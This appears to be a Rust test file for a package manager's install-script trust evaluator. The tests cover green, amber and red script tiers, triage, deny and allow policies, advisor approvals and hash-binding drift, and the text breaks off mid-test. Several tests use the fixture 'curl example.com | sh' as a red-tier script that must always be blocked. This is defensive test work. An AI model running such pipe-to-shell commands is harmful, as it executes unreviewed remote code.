    // Amber and Red classifications flow through to untrusted
    // regardless of policy. Neither class is auto-approved.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    // Amber: network binary downloader.
    let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "playwright install");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let reason = evaluate_trust(
        &pkg_dir,
        "amber-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(
        reason,
        TrustReason::Untrusted,
        "amber-tier network binary downloader must not be auto-trusted under triage",
    );

    // Red: curl | sh. The static-gate tokenizer catches the pipe-
    // to-shell pattern and classifies Red.
    let pkg_dir = write_scripted_pkg(&store, "red-pkg", "1.0.0", "curl example.com | sh");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let reason = evaluate_trust(
        &pkg_dir,
        "red-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(
        reason,
        TrustReason::Untrusted,
        "red-tier (curl | sh) must never auto-trust under any policy — reds are the blocklist"
    );
}

#[test]
fn strict_binding_wins_over_triage_promotion() {
    // Evaluation order: strict gate first. A legitimate strict
    // binding must return `StrictBinding`, NOT
    // `GreenTierUnderTriage`, even when the script would also
    // classify green. This matters for the UX suffix (the user
    // added the binding deliberately; calling it "auto-approval"
    // misrepresents their intent) and for
    // integration test.
    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "greenish-pkg", "1.0.0", "node-gyp rebuild");
    // Compute the on-disk hash so we can pin a valid strict binding
    // rather than drift.
    let script_hash = compute_script_hash(&pkg_dir).unwrap();
    std::fs::write(
        dir.path().join("package.json"),
        format!(
            r#"{{
                    "name": "proj",
                    "lpm": {{
                        "trustedDependencies": {{
                            "greenish-pkg@1.0.0": {{
                                "scriptHash": "{script_hash}"
                            }}
                        }}
                    }}
                }}"#
        ),
    )
    .unwrap();
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let reason = evaluate_trust(
        &pkg_dir,
        "greenish-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(
        reason,
        TrustReason::StrictBinding,
        "strict binding must win over triage green-tier promotion so the UX \
             suffix and downstream consumers see the explicit user intent"
    );
}

#[test]
fn binding_drift_never_auto_recovers_under_triage() {
    // Strict drift floor: a drifted rich binding means the user previously
    // approved a DIFFERENT script; the current on-disk body hasn't
    // been reviewed. Even if it classifies green, triage must not
    // auto-recover. Re-review via `lpm approve-scripts` is the only
    // path back.
    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "drifted-pkg", "1.0.0", "node-gyp rebuild");
    // Wrong script_hash → BindingDrift.
    std::fs::write(
        dir.path().join("package.json"),
        r#"{
                "name": "proj",
                "lpm": {
                    "trustedDependencies": {
                        "drifted-pkg@1.0.0": {
                            "scriptHash": "sha256-deliberately-wrong-hash-to-force-drift"
                        }
                    }
                }
            }"#,
    )
    .unwrap();
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let reason = evaluate_trust(
        &pkg_dir,
        "drifted-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(
        reason,
        TrustReason::BindingDrift,
        "triage must NOT auto-recover a drifted binding — even if the current \
             on-disk script classifies green, user intent was on a different body"
    );
    assert!(!reason.is_trusted());
}

#[test]
fn scope_glob_wins_over_triage_promotion() {
    // Scope match is a deliberate user configuration — ranks
    // above the tier promotion for the same reason strict binding
    // does. The user wrote `@myorg/*` into trustedScopes; any
    // `@myorg/*` package returns `ScopedGlob`, not
    // `GreenTierUnderTriage`, even when its script classifies green.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("package.json"),
        r#"{"lpm":{"scripts":{"trustedScopes":["@myorg/*"]}}}"#,
    )
    .unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "@myorg/thing", "1.0.0", "node-gyp rebuild");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let reason = evaluate_trust(
        &pkg_dir,
        "@myorg/thing",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(
        reason,
        TrustReason::ScopedGlob,
        "scope glob must win over green-tier promotion so the UX reflects \
             explicit user configuration"
    );
}

#[test]
fn trust_reason_is_trusted_covers_all_trusted_variants() {
    // Lock the `is_trusted()` set. If a new `TrustReason` lands
    // later (e.g. `AmberLlmApproval`), this test fails and
    // forces an explicit decision about whether it counts as
    // trusted. Preferable to a silent default that ships wrong.
    assert!(TrustReason::StrictBinding.is_trusted());
    assert!(TrustReason::LegacyName.is_trusted());
    assert!(TrustReason::ScopedGlob.is_trusted());
    assert!(TrustReason::GreenTierUnderTriage.is_trusted());
    // advisor-approved-this-run grants ephemeral
    // trust. Required for the install-time autoBuild path to
    // actually execute scripts the advisor approved.
    assert!(TrustReason::AdvisorApprovedThisRun.is_trusted());
    assert!(!TrustReason::BindingDrift.is_trusted());
    assert!(!TrustReason::Untrusted.is_trusted());
}

// ── AdvisorApprovedThisRun trust path ────────
//
// Locks the new amber-tier short-circuit in
// `evaluate_trust_unsuspended`. The test matrix below maps
// 1:1 to the six locked product cases:
//
//   1. triage-advisor = none → behavior identical to portable
//   2. (env-not-ready preflight failure handled in
//      triage_advisor_session::tests)
//   3. Approve upgrades only prompted packages → AdvisorApprovedThisRun
//   4. Manual/Abstain do not change outcome → still Untrusted
//   5. (multi-package warn-once covered in install-flow integration)
//   6. deny / allow ignore advisor_approvals (kept as Untrusted /
//      executed-via-other-path)

#[test]
fn advisor_approval_promotes_amber_under_triage() {
    // The core slice-1 behavior: a package with an amber-tier
    // postinstall (`node install.js` — binary-fetcher convention,
    // amber by.5), no trustedDependencies entry, no scope
    // match — but its (name, version) appears in the advisor
    // approval set. Under triage, must return
    // AdvisorApprovedThisRun and pass `is_trusted()`.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    // `node install.js` classifies amber per the reserved-basename
    // rule — perfect amber input for slice-1 promotion.
    let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let mut approvals = std::collections::HashSet::new();
    approvals.insert((
        "amber-pkg".to_string(),
        "1.0.0".to_string(),
        None,
        None,
        String::new(),
    ));

    let reason = evaluate_trust(
        &pkg_dir,
        "amber-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        Some(&approvals),
    );
    assert_eq!(reason, TrustReason::AdvisorApprovedThisRun);
    assert!(reason.is_trusted());
}

#[test]
fn none_approvals_yield_untrusted_for_amber() {
    // Locked test-matrix case 1: `triage-advisor = none` (modeled
    // by passing `None` as the approval set) must leave amber
    // untrusted, identical to portable behavior.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let reason = evaluate_trust(
        &pkg_dir,
        "amber-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(reason, TrustReason::Untrusted);
    assert!(!reason.is_trusted());
}

#[test]
fn empty_approvals_yield_untrusted_for_amber() {
    // Adjacent to "advisor = none": user has an advisor configured
    // but it approved nothing this run. Empty set → Untrusted.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let approvals: std::collections::HashSet<crate::triage_advisor_session::AdvisorApprovalKey> =
        std::collections::HashSet::new();
    let reason = evaluate_trust(
        &pkg_dir,
        "amber-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        Some(&approvals),
    );
    assert_eq!(reason, TrustReason::Untrusted);
}

#[test]
fn advisor_approval_for_other_package_does_not_promote_this_one() {
    // Locked test-matrix case 3 corollary: approval is scoped to
    // (name, version). A wrong-key approval must NOT promote.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let mut approvals = std::collections::HashSet::new();
    approvals.insert((
        "OTHER-pkg".to_string(),
        "1.0.0".to_string(),
        None,
        None,
        String::new(),
    ));
    approvals.insert((
        "amber-pkg".to_string(),
        "2.0.0".to_string(),
        None,
        None,
        String::new(),
    )); // wrong version
    let reason = evaluate_trust(
        &pkg_dir,
        "amber-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        Some(&approvals),
    );
    assert_eq!(reason, TrustReason::Untrusted);
}

#[test]
fn advisor_approval_does_not_apply_under_deny() {
    // Locked test-matrix case 6: deny ignores advisor approvals.
    // The advisor was preflighted only under triage; under deny
    // the policy is "never auto-run". An approval set passed
    // (defensively) must not flip the outcome.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let mut approvals = std::collections::HashSet::new();
    approvals.insert((
        "amber-pkg".to_string(),
        "1.0.0".to_string(),
        None,
        None,
        String::new(),
    ));
    let reason = evaluate_trust(
        &pkg_dir,
        "amber-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        Some(&approvals),
    );
    // Deny short-circuits before the advisor check would fire.
    assert_eq!(reason, TrustReason::Untrusted);
}

#[test]
fn advisor_approval_does_not_apply_under_allow() {
    // Symmetric to the deny case: allow runs every script via
    // the manifest-only path; the advisor surface isn't consulted.
    // Approval set defensively passed has no effect on the trust
    // reason returned.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let mut approvals = std::collections::HashSet::new();
    approvals.insert((
        "amber-pkg".to_string(),
        "1.0.0".to_string(),
        None,
        None,
        String::new(),
    ));
    let reason = evaluate_trust(
        &pkg_dir,
        "amber-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Allow,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        Some(&approvals),
    );
    // Under allow, the policy bypasses the trust-reason path
    // entirely at execution time; here at the evaluator level
    // the result mirrors Untrusted (no manifest binding) and
    // the live executor doesn't gate on it.
    assert_eq!(reason, TrustReason::Untrusted);
}

#[test]
fn advisor_approval_does_not_leak_across_sources_with_same_coord() {
    // Locked safety property: Two
    // packages with the same name+version but different
    // integrity hashes (e.g. one registry source, one
    // workspace / file source) must be approved INDEPENDENTLY.
    // Approving the registry source must NOT auto-run the
    // workspace source's script in the same install.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    // Approve ONLY the integrity-bearing variant.
    let mut approvals = std::collections::HashSet::new();
    approvals.insert((
        "amber-pkg".to_string(),
        "1.0.0".to_string(),
        None,
        Some("sha512-registry-integrity".to_string()),
        String::new(),
    ));

    // Querying for the SAME coord but a DIFFERENT integrity must
    // not match — the trust evaluator returns Untrusted.
    let reason_workspace = evaluate_trust(
        &pkg_dir,
        "amber-pkg",
        "1.0.0",
        None, // workspace-style: no integrity
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        Some(&approvals),
    );
    assert_eq!(reason_workspace, TrustReason::Untrusted);

    // And for ANOTHER integrity (e.g. a file source with a
    // different sha): also Untrusted.
    let reason_other_integrity = evaluate_trust(
        &pkg_dir,
        "amber-pkg",
        "1.0.0",
        Some("sha512-file-source-integrity"),
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        Some(&approvals),
    );
    assert_eq!(reason_other_integrity, TrustReason::Untrusted);

    // Sanity: the integrity that IS in the set DOES grant the
    // ephemeral approval. Confirms the lookup isn't otherwise
    // broken.
    let reason_match = evaluate_trust(
        &pkg_dir,
        "amber-pkg",
        "1.0.0",
        Some("sha512-registry-integrity"),
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        Some(&approvals),
    );
    assert_eq!(reason_match, TrustReason::AdvisorApprovedThisRun);
}

#[test]
fn green_under_triage_still_wins_over_advisor() {
    // Sanity: a green script doesn't go through the advisor at
    // all — the existing GreenTierUnderTriage short-circuit
    // wins. Approval set is irrelevant.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let pkg_dir = write_scripted_pkg(&store, "green-pkg", "1.0.0", "node-gyp rebuild");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let mut approvals = std::collections::HashSet::new();
    approvals.insert((
        "green-pkg".to_string(),
        "1.0.0".to_string(),
        None,
        None,
        String::new(),
    ));
    let reason = evaluate_trust(
        &pkg_dir,
        "green-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        Some(&approvals),
    );
    // GreenTierUnderTriage WINS — the advisor variant is reserved
    // for amber. If this test starts returning AdvisorApprovedThisRun
    // it means the green short-circuit broke.
    assert_eq!(reason, TrustReason::GreenTierUnderTriage);
}

// ── all_scripted_packages_trusted triage ───
//
// These lock the install-time auto-build predicate's side of the
// contract. The predicate and `rebuild::run` now both route
// through `evaluate_trust`, so any divergence between what gets
// triggered (predicate=true → build::run runs) and what actually
// builds (build::run's per-package filter) would be a bug the
// plan explicitly calls out in:
//
//   "under `"triage"`, a green-tier unbuilt package counts as
//    trusted for auto-build-triggering purposes"
//
// The tests already cover the deny/drift/scope/strict
// variants; the new cases below are specifically about the
// triage-green-auto-trust path through the predicate.

#[test]
fn all_scripted_packages_trusted_true_under_triage_green_without_binding() {
    // The core behavior: `lpm install` auto-build predicate
    // returns `true` for a fresh green-only install under triage,
    // even though no `trustedDependencies` entry exists. Previously
    // this returned `false` and auto-build never ran for installs
    // without manifest bindings.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    // node-gyp rebuild — exact green-tier allowlist match.
    write_scripted_pkg(&store, "native-a", "1.0.0", "node-gyp rebuild");
    // tsc — also green.
    write_scripted_pkg(&store, "native-b", "1.0.0", "tsc");

    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let trusted = all_scripted_packages_trusted(
        &lpm_root,
        &[
            ("native-a".to_string(), "1.0.0".to_string(), None),
            ("native-b".to_string(), "1.0.0".to_string(), None),
        ],
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert!(
        trusted,
        "triage + all-green scripted packages must satisfy the auto-build \
             predicate (— without this the install → \
             auto-build handoff would never fire under triage)"
    );
}

#[test]
fn all_scripted_packages_trusted_false_under_deny_same_input() {
    // Control: same input under deny stays false. Confirms the
    // migration didn't leak triage semantics into deny mode.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    write_scripted_pkg(&store, "native-a", "1.0.0", "node-gyp rebuild");

    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let trusted = all_scripted_packages_trusted(
        &lpm_root,
        &[("native-a".to_string(), "1.0.0".to_string(), None)],
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert!(
        !trusted,
        "deny must not promote green-tier; the predicate has to match \
             the shared helper's deny semantics (no tier widening)"
    );
}

#[test]
fn all_scripted_packages_trusted_false_under_triage_mixed_green_amber() {
    // An amber package in the set blocks the predicate even under
    // Auto-build may run trusted greens and leave ambers in
    // `build-state.json` with a pointer, but the predicate returns
    // false for mixed green + amber sets unless another auto-build
    // override is active.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    write_scripted_pkg(&store, "green-pkg", "1.0.0", "node-gyp rebuild");
    // `playwright install` classifies amber as a network binary downloader.
    write_scripted_pkg(&store, "amber-pkg", "1.0.0", "playwright install");

    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let trusted = all_scripted_packages_trusted(
        &lpm_root,
        &[
            ("green-pkg".to_string(), "1.0.0".to_string(), None),
            ("amber-pkg".to_string(), "1.0.0".to_string(), None),
        ],
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert!(
        !trusted,
        "mixed green+amber under triage must fail the predicate — \
             ambers require explicit review"
    );
}

#[test]
fn all_scripted_packages_trusted_false_under_triage_any_red() {
    // Red tiers are never auto-trusted. Ever. Under any policy.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    write_scripted_pkg(&store, "red-pkg", "1.0.0", "curl example.com | sh");

    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let trusted = all_scripted_packages_trusted(
        &lpm_root,
        &[("red-pkg".to_string(), "1.0.0".to_string(), None)],
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert!(!trusted);
}

#[test]
fn all_scripted_packages_trusted_false_under_triage_drift() {
    // Drift still blocks — a drifted rich binding does not
    // auto-recover even when the current on-disk script would
    // classify green. Mirrors the helper contract; this
    // test pins it specifically at the predicate boundary.
    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    write_scripted_pkg(&store, "drift-pkg", "1.0.0", "node-gyp rebuild");
    std::fs::write(
        dir.path().join("package.json"),
        r#"{
                "lpm": {
                    "trustedDependencies": {
                        "drift-pkg@1.0.0": {"scriptHash": "sha256-bogus"}
                    }
                }
            }"#,
    )
    .unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let trusted = all_scripted_packages_trusted(
        &lpm_root,
        &[("drift-pkg".to_string(), "1.0.0".to_string(), None)],
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert!(
        !trusted,
        "drifted binding must block the predicate under triage — \
             prevents install silently re-running a changed script \
             (Strict drift floor)"
    );
}

#[test]
fn all_scripted_packages_trusted_ignores_already_built_amber_under_triage() {
    // Already-built ambers drop out of the predicate regardless of
    // policy — the auto-build predicate is about NEW work, not
    // re-reviewing previously-executed scripts. Matches the
    // previous "ignores already-built untrusted packages" test,
    // extended to triage mode.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    write_scripted_pkg(&store, "green-pkg", "1.0.0", "node-gyp rebuild");
    // Mark as already-built so the predicate ignores it.
    let amber_dir = write_scripted_pkg(&store, "amber-built", "1.0.0", "playwright install");
    std::fs::write(amber_dir.join(BUILD_MARKER), "").unwrap();

    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let trusted = all_scripted_packages_trusted(
        &lpm_root,
        &[
            ("green-pkg".to_string(), "1.0.0".to_string(), None),
            ("amber-built".to_string(), "1.0.0".to_string(), None),
        ],
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert!(
        trusted,
        "already-built ambers must NOT block the predicate — the predicate \
             is about newly-installed work"
    );
}

#[test]
fn classify_package_worst_tier_reduces_worst_wins() {
    // Aggregation contract: the helper uses the same worst-wins
    // reducer `build_state.rs:418-421` uses so install-time and
    // build-time consumers see the same tier. A red postinstall
    // must dominate a green preinstall.
    let scripts = HashMap::from([
        ("preinstall".into(), "node-gyp rebuild".into()),
        ("postinstall".into(), "curl example.com | sh".into()),
    ]);
    assert_eq!(classify_package_worst_tier(&scripts), Some(StaticTier::Red));

    // All-green stays green.
    let scripts = HashMap::from([
        ("preinstall".into(), "node-gyp rebuild".into()),
        ("postinstall".into(), "tsc".into()),
    ]);
    assert_eq!(
        classify_package_worst_tier(&scripts),
        Some(StaticTier::Green)
    );

    // Empty → None (caller short-circuits).
    let empty = HashMap::new();
    assert_eq!(classify_package_worst_tier(&empty), None);
}

// ── force-security-floor approval suspension ──
//
// Acceptance criteria pinned here:
// 1. `force-security-floor = false`: existing approvals run
//    normally (back-compat).
// 2. `force-security-floor = true`: the same approval is
//    suspended — `is_trusted()` returns false, the script
//    would not run under `lpm rebuild`.
// 3. Unsetting the flag (passing `false` again) restores the
//    approval without any re-review (approval state lives in
//    `package.json`, not in a separate suspension record).
// 4. No behavior change for users with no approvals — the
//    `Untrusted` path is unaffected by the flag.
// 5. `SuspendedByForceFloor` is classified as not-trusted.
//
// Suspended-count reporting in `lpm doctor` is covered in the
// doctor.rs test module separately.

/// Helper: write a package.json with a rich-binding approval
/// for the given package name + version. Integrity field is
/// omitted so the strict-gate treats it as "no constraint,"
/// matching our test fixture where the synthetic lockfile has
/// `None` integrity.
///
/// The Rich variant uses `"{name}@{version}"` as the map key
/// — see `TrustedDependencies::rich_key` in lpm-workspace.
fn write_pkg_json_with_strict_approval(
    project_dir: &Path,
    name: &str,
    version: &str,
    script_hash: &str,
) {
    let key = format!("{name}@{version}");
    let body = serde_json::json!({
        "name": "test-project",
        "lpm": {
            "trustedDependencies": {
                key: {
                    "scriptHash": script_hash,
                }
            }
        }
    });
    std::fs::write(project_dir.join("package.json"), body.to_string()).unwrap();
}

/// Acceptance #1 + #4: with `force-security-floor = false`, an
/// existing StrictBinding approval is honored and returns
/// trusted. Pins back-compat.
#[test]
fn force_floor_false_honors_existing_strict_approval() {
    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "esbuild", "0.25.1", "node-gyp rebuild");
    let hash = compute_script_hash(&pkg_dir).expect("script hash");
    write_pkg_json_with_strict_approval(dir.path(), "esbuild", "0.25.1", &hash);
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();

    let reason = evaluate_trust(
        &pkg_dir,
        "esbuild",
        "0.25.1",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false, // force-security-floor OFF
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );

    assert_eq!(reason, TrustReason::StrictBinding);
    assert!(reason.is_trusted());
}

/// Acceptance #2: with `force-security-floor = true`, the
/// same approval is suspended. is_trusted() returns false;
/// the distinct `SuspendedByForceFloor` reason code
/// distinguishes this from a package with no approval.
#[test]
fn force_floor_true_suspends_existing_strict_approval() {
    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "esbuild", "0.25.1", "node-gyp rebuild");
    let hash = compute_script_hash(&pkg_dir).expect("script hash");
    write_pkg_json_with_strict_approval(dir.path(), "esbuild", "0.25.1", &hash);
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();

    let reason = evaluate_trust(
        &pkg_dir,
        "esbuild",
        "0.25.1",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        true, // force-security-floor ON
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );

    assert_eq!(reason, TrustReason::SuspendedByForceFloor);
    assert!(!reason.is_trusted());
}

/// Acceptance #3: unsetting the flag (calling again with
/// false) reactivates the approval. No re-review needed —
/// approval state lives in package.json and is unchanged by
/// the flag flip.
#[test]
fn force_floor_unsetting_reactivates_approval_without_re_review() {
    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "esbuild", "0.25.1", "node-gyp rebuild");
    let hash = compute_script_hash(&pkg_dir).expect("script hash");
    write_pkg_json_with_strict_approval(dir.path(), "esbuild", "0.25.1", &hash);
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();

    // Flag ON → suspended.
    let r_on = evaluate_trust(
        &pkg_dir,
        "esbuild",
        "0.25.1",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        true,
        &crate::capability::CapabilitySet::default(),
